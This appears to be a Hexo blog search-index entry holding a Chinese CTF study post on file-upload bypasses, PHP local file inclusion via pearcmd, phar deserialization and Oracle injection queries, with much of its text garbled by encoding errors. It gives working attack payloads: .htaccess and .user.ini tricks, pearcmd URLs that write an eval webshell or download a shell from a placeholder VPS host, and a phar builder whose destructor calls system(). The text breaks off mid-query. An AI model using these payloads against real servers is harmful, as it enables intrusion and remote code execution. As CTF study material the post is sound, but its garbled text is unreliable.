<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Upload_LFIè¡¥è¯¾</title>
      <link href="/2025/06/10/Upload-LFI-plus/"/>
      <url>/2025/06/10/Upload-LFI-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labè¡¥æµ‹"><a href="#upload-labè¡¥æµ‹" class="headerlink" title="upload_labè¡¥æµ‹"></a>upload_labè¡¥æµ‹</h1><h1 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h1><ul><li><h3 id="å‰ç«¯æ‹¦æˆª"><a href="#å‰ç«¯æ‹¦æˆª" class="headerlink" title="å‰ç«¯æ‹¦æˆª"></a>å‰ç«¯æ‹¦æˆª</h3></li></ul><p>å‰ç«¯éƒ½æ˜¯çº¸è€è™<br>ç®€å•çš„è¯å°±ä½¿ç”¨consoleä¿®æ”¹å‰ç«¯jså®ç°<br>å¤æ‚çš„è¯å°±ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹æµé‡åŒ…</p><ul><li><h3 id="MIMEç±»å‹åˆ¤æ–­"><a href="#MIMEç±»å‹åˆ¤æ–­" class="headerlink" title="MIMEç±»å‹åˆ¤æ–­"></a>MIMEç±»å‹åˆ¤æ–­</h3></li></ul><p>ä¾‹å¦‚é™åˆ¶äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›´æ¥åœ¨ä¸Šä¼ æœ¨é©¬æ—¶ä¿®æ”¹æˆå¯¹åº”çš„å³å¯<br>ä¸ä¼šå½±å“æ–‡ä»¶çš„ä½¿ç”¨</p><ul><li><h3 id="é»‘åå•ï¼ˆè¿‡æ»¤ä¸å…¨ï¼‰"><a href="#é»‘åå•ï¼ˆè¿‡æ»¤ä¸å…¨ï¼‰" class="headerlink" title="é»‘åå•ï¼ˆè¿‡æ»¤ä¸å…¨ï¼‰"></a>é»‘åå•ï¼ˆè¿‡æ»¤ä¸å…¨ï¼‰</h3></li></ul><p>é‚£ä¹ˆå¯ä»¥è§£æä¸ºphpçš„æ–‡ä»¶åç¼€æœ‰å¾ˆå¤š<br>å¸¸è§çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php,php3,php4,php5,phtml</span><br></pre></td></tr></table></figure><ul><li><h3 id="é»‘åå•ï¼ˆè¿‡æ»¤å…¨æœ¨é©¬ï¼‰"><a href="#é»‘åå•ï¼ˆè¿‡æ»¤å…¨æœ¨é©¬ï¼‰" class="headerlink" title="é»‘åå•ï¼ˆè¿‡æ»¤å…¨æœ¨é©¬ï¼‰"></a>é»‘åå•ï¼ˆè¿‡æ»¤å…¨æœ¨é©¬ï¼‰</h3></li></ul><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶<br>å¯ä»¥è®©æ›´å¤šçš„æ–‡ä»¶ç±»å‹è§£æä¸ºphp<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory /&gt;</span><br><span class="line">  Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">  AllowOverride All</span><br><span class="line">  Order allow,deny</span><br><span class="line">  Allow from all</span><br><span class="line">  Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ <code>.user.ini</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.txt</span><br></pre></td></tr></table></figure><ul><li><h3 id="æ–‡ä»¶åå¤„ç†é€»è¾‘"><a href="#æ–‡ä»¶åå¤„ç†é€»è¾‘" class="headerlink" title="æ–‡ä»¶åå¤„ç†é€»è¾‘"></a>æ–‡ä»¶åå¤„ç†é€»è¾‘</h3></li></ul><p>åŠ ç‚¹ï¼ŒåŠ ç©ºæ ¼ï¼ŒåŒå†™ï¼Œ0x00é˜¶æ®µ<br>ä¸é‡å¤å†™äº†</p><h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><h3 id="php-pearæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#php-pearæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="php pearæ–‡ä»¶åŒ…å«æ¼æ´"></a>php pearæ–‡ä»¶åŒ…å«æ¼æ´</h3><p>å…¨ç§°ä¸ºPHP Extension and Application Repository<br>å¼€å¯äº†register_argc_argvè¿™ä¸ªé€‰é¡¹<br>urlä¸­?åé¢çš„å†…å®¹éƒ½ä¼šä¼ å…¥$_SERVER[â€˜argvâ€™]è¿™ä¸ªå˜é‡é‡Œ<br>argvæ˜¯é€šè¿‡+ä½œä¸ºåˆ†éš”ç¬¦<br>pearæ–‡ä»¶æºç :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  PHP=<span class="string">&quot;<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/share/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    INCDIR=`<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/php&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=0 -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œäº†pearæ—¶ï¼Œä¼šå°†$_SERVER[â€˜argvâ€™]å½“ä½œå‚æ•°ä¸€èµ·æ‰§è¡Œï¼Œä»è€Œè‡ªåŠ¨æ‹‰å–äº†æŒ‡å®šçš„phpæ–‡ä»¶</p><ul><li><h3 id="newstarctf-2023å…¬å¼€èµ›é“include-ğŸ"><a href="#newstarctf-2023å…¬å¼€èµ›é“include-ğŸ" class="headerlink" title="newstarctf 2023å…¬å¼€èµ›é“include ğŸ"></a>newstarctf 2023å…¬å¼€èµ›é“include ğŸ</h3></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºæ‰¾åˆ°<code>phpinfo.php</code><br>å‘ç°<code>fake&#123;Check_register_argc_argv&#125;</code><br>äºæ˜¯æŸ¥çœ‹<code>register_argc_argv</code>éƒ½æ˜¯on<br>ä¸”phpæœåŠ¡çš„è·¯å¾„ä¸º<code>/usr/local/etc/php</code><br>è€Œå½“å‰ç½‘é¡µçš„è·¯å¾„ä¸º<code>SCRIPT_FILENAME/var/www/html/index.php</code><br>æ‰€ä»¥å¯ä»¥ä½¿ç”¨pearcmd.phpè¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œ<br>pearå‘½ä»¤å¯ä½¿ç”¨çš„å‚æ•°:<br><img src="/2025/06/10/Upload-LFI-plus/1.png"><br>æ„é€ :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡å™¨ä¸­è¿è¡Œçš„å‘½ä»¤å®é™…ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create &quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;&quot; /var/www/html/a.php</span><br></pre></td></tr></table></figure><p>æœ€ååŒ…å«a.phpå³å¯å®Œæˆgetshell<br><em>PS:å°–æ‹¬å·ç”¨burpsuiteå‘</em><br><a href="https://whhxy4.github.io/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#:~:text=PHP%E8%A3%B8%E6%96%87%E4%BB%B6">https://whhxy4.github.io/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#:~:text=PHP%E8%A3%B8%E6%96%87%E4%BB%B6</a></p><ul><li><h3 id="æå®¢å¤§æŒ‘æˆ˜2024-ez-include"><a href="#æå®¢å¤§æŒ‘æˆ˜2024-ez-include" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2024]ez_include"></a>[æå®¢å¤§æŒ‘æˆ˜2024]ez_include</h3></li></ul><p>é¢˜ç›®:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿˜æƒ³éé¢„æœŸ?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªç»•è¿‡require_onceåŒ…å«é™åˆ¶çš„é¢˜<br>è¯¦è§<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿›å…¥ç¬¬äºŒæ­¥&#x2F;levelllll2.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hintéƒ½ç»™çš„è¿™ä¹ˆæ˜æ˜¾äº†è¿˜ä¸ä¼šåš?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°register_argc_argv &#x3D; On,å¯èƒ½æ˜¯pearæ–‡ä»¶åŒ…å«æ¼æ´<br>æ„é€ payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&amp;+download+http://vpsåœ°å€:vpsç«¯å£/1.php</span><br></pre></td></tr></table></figure><p>æˆåŠŸgetshell</p><h1 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h1><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><h1 id="pharæ–‡ä»¶åŒ…å«"><a href="#pharæ–‡ä»¶åŒ…å«" class="headerlink" title="pharæ–‡ä»¶åŒ…å«"></a>pharæ–‡ä»¶åŒ…å«</h1><p>pharæ”¯æŒå¯¹ä¸€äº›å‹ç¼©åŒ…çš„æ“ä½œ<br>ä¸è¿‡åªæ”¯æŒ<code>.zip</code>å’Œ<code>.tar</code>æ ¼å¼çš„</p><ul><li><h3 id="pharä¼ªåè®®çš„åˆ©ç”¨"><a href="#pharä¼ªåè®®çš„åˆ©ç”¨" class="headerlink" title="pharä¼ªåè®®çš„åˆ©ç”¨"></a>pharä¼ªåè®®çš„åˆ©ç”¨</h3></li></ul><p>ä¾‹å¦‚æˆ‘ä»¬å†™ä¸€ä¸ª<code>test.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å…¶å‹ç¼©ä¸º<code>test.zip</code><br>ç„¶åç›´æ¥ä¿®æ”¹æ–‡ä»¶åä¸º<code>test.jpg</code><br>å°±å¯ä»¥æ­£å¸¸ä¸Šä¼ </p><p>å¦‚æœæœ‰ä¸€ä¸ª<code>include</code>çš„æ–‡ä»¶åŒ…å«ç‚¹<br>å°±å¯ä»¥åˆ©ç”¨<code>phar</code>ä¼ªåè®®åŒ…å«æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://./test.jpg/test.php&#x27;</span>); </span><br><span class="line"><span class="comment">// æ‰§è¡Œå‹ç¼©åŒ…å†…çš„test.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>è¿™è®©æˆ‘æƒ³èµ·<code>shiro</code>çš„<code>cookie</code>ååºåˆ—åŒ–</p><ul><li><h5 id="Pharæ–‡ä»¶ç»“æ„"><a href="#Pharæ–‡ä»¶ç»“æ„" class="headerlink" title="Pharæ–‡ä»¶ç»“æ„"></a>Pharæ–‡ä»¶ç»“æ„</h5></li></ul><p>A stubï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stubçš„åŸºæœ¬ç»“æ„ï¼š&lt;?php HALT_COMPILER();</span><br><span class="line">stubå¿…é¡»ä»¥HALT_COMPILER();æ¥ä½œä¸ºç»“æŸéƒ¨åˆ†ï¼Œ</span><br><span class="line">å¦åˆ™Pharæ‹“å±•å°†ä¸ä¼šè¯†åˆ«è¯¥æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>a manifest describing the contents:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pharæ–‡ä»¶ä¸­è¢«å‹ç¼©çš„æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œ</span><br><span class="line">å…¶ä¸­Meta-dataéƒ¨åˆ†çš„ä¿¡æ¯ä¼šä»¥ååºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜ï¼Œ</span><br><span class="line">è¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®ç‚¹</span><br></pre></td></tr></table></figure><p><img src="/2025/06/10/Upload-LFI-plus/1.png" alt="alt text"><br>the file contents:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ²¡æœ‰ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">è¿™ä¸ªè¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹å¯ä»¥éšä¾¿å†™çš„ï¼Œ</span><br><span class="line">å› ä¸ºæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘å®ƒçš„ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p>a signature for verifying Phar integrityï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç­¾åæ ¼å¼</span><br></pre></td></tr></table></figure><p><img src="/2025/06/10/Upload-LFI-plus/2.png" alt="alt text"></p><p>ç”Ÿæˆä¸€ä¸ªphar:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…·ä½“çš„åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¶æ„ç±»ï¼šåŒ…å«å¯è¢«åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“å¯¹è±¡è¢«é”€æ¯æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆååºåˆ—åŒ–è§¦å‘ç‚¹ï¼‰</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);  <span class="comment">// é«˜å±æ“ä½œï¼šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exploit.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exploit.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæ¶æ„å¯¹è±¡è€Œé Test å¯¹è±¡</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MaliciousClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&quot;touch /tmp/hacked&quot;</span>;  <span class="comment">// ä¿®æ”¹æ­¤å¤„æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆå¦‚åå¼¹shellï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);  <span class="comment">// æ³¨å…¥æ¶æ„å¯¹è±¡åˆ°å…ƒæ•°æ®</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><p>Oracle Databaseï¼Œåˆå Oracle RDBMSï¼Œæˆ–ç®€ç§° Oracleã€‚<br>æ˜¯ç”²éª¨æ–‡å…¬å¸çš„ä¸€æ¬¾å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚<br>å®ƒæ˜¯åœ¨æ•°æ®åº“é¢†åŸŸä¸€ç›´å¤„äºé¢†å…ˆåœ°ä½çš„äº§å“ã€‚<br>å¯ä»¥è¯´ Oracle æ•°æ®åº“ç³»ç»Ÿæ˜¯ä¸–ç•Œä¸Šæµè¡Œçš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œ<br>ç³»ç»Ÿå¯ç§»æ¤æ€§å¥½ã€ä½¿ç”¨æ–¹ä¾¿ã€åŠŸèƒ½å¼ºï¼Œ<br>é€‚ç”¨äºå„ç±»å¤§ã€ä¸­ã€å°å¾®æœºç¯å¢ƒã€‚å®ƒæ˜¯ä¸€ç§é«˜æ•ˆç‡çš„ã€<br>å¯é æ€§å¥½çš„ã€é€‚åº”é«˜ååé‡çš„æ•°æ®åº“æ–¹æ¡ˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### æ•°æ®åº“æ“ä½œ</span><br><span class="line">â€¢ æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>â€“ æ— éœ€ç‰¹æƒ<br>SELECT banner FROM v$version WHERE banner LIKE â€˜Oracle%â€™;<br>â€“ éœ€è¦ç‰¹æƒ<br>SELECT version FROM v$instance;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¢ æŸ¥è¯¢æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>SELECT banner FROM v$version where banner like â€˜TNS%â€™;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">â€¢ æŸ¥è¯¢æ•°æ®åº“è¿è¡Œçš„ä¸»æœºå</span><br></pre></td></tr></table></figure><p>â€“ éœ€è¦ç‰¹æƒ<br>SELECT UTL_INADDR.get_host_name FROM dual;<br>â€“ éœ€è¦ç‰¹æƒ<br>SELECT host_name FROM v$instance;<br>â€“ éœ€è¦ç‰¹æƒ<br>SELECT UTL_INADDR.get_host_name(â€˜127.0.0.1â€™) FROM dual;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¢ æŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™çš„æ‰€æœ‰æ•°æ®åº“</span><br></pre></td></tr></table></figure><p>SELECT DISTINCT owner,table_name FROM all_tables WHERE owner&#x3D;user;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¢ æŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™çš„æ‰€æœ‰æ•°æ®åº“</span><br></pre></td></tr></table></figure><p>â€“ æ— éœ€ç‰¹æƒ<br>SELECT global_name FROM global_name;<br>â€“ æ— éœ€ç‰¹æƒ<br>SELECT SYS.DATABASE_NAME FROM DUAL;<br>â€“ éœ€è¦ç‰¹æƒ<br>SELECT name FROM v$database;<br>â€“ éœ€è¦ç‰¹æƒ<br>SELECT instance_name FROM v$instance;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¢ æŸ¥è¯¢æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·</span><br></pre></td></tr></table></figure><p>â€“ éœ€è¦ç‰¹æƒ<br>SELECT DISTINCT grantee 